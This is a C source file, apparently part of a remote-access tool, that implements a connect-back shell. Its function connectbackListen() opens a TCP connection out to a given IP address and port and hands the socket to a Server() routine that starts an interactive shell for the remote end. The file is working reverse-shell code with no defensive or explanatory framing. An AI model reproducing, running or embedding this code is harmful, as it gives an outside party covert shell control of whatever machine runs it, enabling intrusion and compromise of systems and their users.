#include "connect_shell.h"
#include "shell.h"
#include "debug.h"

int connectbackListen( char* ip, int port)
{
	int sock;
	int retval = 0;
	struct sockaddr_in client;

	//Get a Socket
	if( ( sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP) ) == SOCKET_ERROR )
	{
		// socket() failed
		D( perror( "socket()" ); )
		return FAILURE;
	}
		
	//setup the connect struct
	memset(&client, 0, sizeof(struct sockaddr_in));
	client.sin_family = AF_INET;
	client.sin_addr.s_addr = inet_addr(ip);
	client.sin_port = htons(port);
		
	//Connect to the CLIENT
	if(SOCKET_ERROR == connect(sock,(struct sockaddr *)&client,sizeof(struct sockaddr_in)))
	{
		D( perror( "connect()" ); )
		closesocket(sock);
		return FAILURE;
	}

	//This will start the active connect shell with the client
	//at this point, we have an established TCP/IP connection
	retval = Server(sock);
		
//	D( printf( " DEBUG %s:%i\n", __FILE__, __LINE__ ); )
	closesocket(sock);

//	D( printf( " DEBUG %s:%i\n", __FILE__, __LINE__ ); )
	return retval;
}

